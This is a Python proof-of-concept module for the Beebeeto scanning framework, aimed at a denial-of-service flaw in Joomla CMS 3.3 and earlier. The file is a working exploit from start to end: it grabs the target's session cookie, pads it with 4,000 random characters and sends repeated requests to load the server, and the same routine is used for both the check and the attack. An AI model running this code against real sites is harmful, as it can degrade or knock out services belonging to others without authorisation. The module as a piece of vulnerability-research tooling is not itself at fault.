#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib
import urllib2
import requests
import random

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
          # poc相关信息
          'poc': {
              'id': 'poc-2015-0038',
              'name': 'Joomla CMS<=3.3 DOS漏洞 POC',
              'author': 'Dave',
              'create_date': '2015-02-27',
          },
          # 协议相关信息
          'protocol': {
              'name': 'http',
              'port': [80],
              'layer4_protocol': ['tcp'],
          },
          # 漏洞相关信息
          'vul': {
              'app_name': 'Joomla',
              'vul_version': ['<=3.3',],
              'type': 'Denial of Service',
              'tag': ['Joomla漏洞', 'DOS', 'Joomla! DOS', 'PHP'],
              'desc': 'Joomla! Unsafe Design Contributes To DOS.',
              'references': ['http://blog.0verl0ad.com/2015/02/0-day-en-joomla-todas-las-versiones.html',
              ],
          },
    }


    @classmethod
    def verify(cls, args):
        _Host = args['options']['target']
        if _Host.startswith('http://'):
            _Host = _Host
        else:
            _Host = "http://" + _Host

        try:
            _Req = requests.session().get(_Host)

            _WebContent = str(_Req.headers)
            _WebTmp = _WebContent.split('; path=/')
            _WebTmp = _WebTmp[0]
            _WebTmp = _WebTmp.split('\'')
            _WebTmp = _WebTmp[len(_WebTmp) - 1]
            _WebTmp = _WebTmp.split('=')
            _SessionID = _WebTmp[0]
            _Session = _WebTmp[1]
        except:
            args['success'] = False
            return args


        for i in range(4000):
            _Session += random.choice(['0','1','2','3','4','5','6','7','8','9','q','w','e','r','t','y','u','i',
                                     'o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m'])

        _Cookies = {
            _SessionID : _Session
        }

        HEADER = {
            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0'
        }

        _Count = 0
        for i in range(10):
            _Req = requests.get(_Host,cookies=_Cookies,headers=HEADER)
            _TmpContent = _Req.content
            if len(_TmpContent) > _Count:
                _Count = len(_TmpContent)
                args['success'] = False
            else:
                args['success'] = True
                break
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())